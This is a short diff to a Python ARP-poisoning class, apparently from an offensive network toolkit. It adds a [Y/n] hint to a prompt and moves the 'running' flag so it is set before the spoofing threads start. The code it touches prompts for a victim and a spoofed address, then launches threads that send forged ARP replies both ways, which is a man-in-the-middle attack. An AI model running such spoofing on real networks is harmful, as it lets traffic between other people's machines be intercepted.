@@ -28,7 +28,7 @@ class arp(Poison):
             # get ip addresses from user
             to_ip = raw_input("[!] Enter host to poison:\t")
             from_ip = raw_input("[!] Enter address to spoof:\t")
-            tmp = raw_input("[!] Spoof IP {0} from victim {1}.  Is this correct? ".format(to_ip, from_ip))
+            tmp = raw_input("[!] Spoof IP {0} from victim {1}.  Is this correct? [Y/n]".format(to_ip, from_ip))
 
             self.victim = (to_ip, getmacbyip(to_ip))
             self.target = (from_ip, getmacbyip(from_ip))
@@ -50,6 +50,7 @@ class arp(Poison):
         try:
             # send ARP replies to victim
             debug('Beginning ARP spoof to victim...')
+            self.running = True
             victim_thread = Thread(target=self.respoofer,
                                         args=(self.target, self.victim))
             victim_thread.start()
@@ -57,7 +58,6 @@ class arp(Poison):
             target_thread = Thread(target=self.respoofer,
                                         args=(self.victim, self.target))
             target_thread.start()
-            self.running = True
         except KeyboardInterrupt:
             Msg('Closing ARP poison down...')
             self.running = False
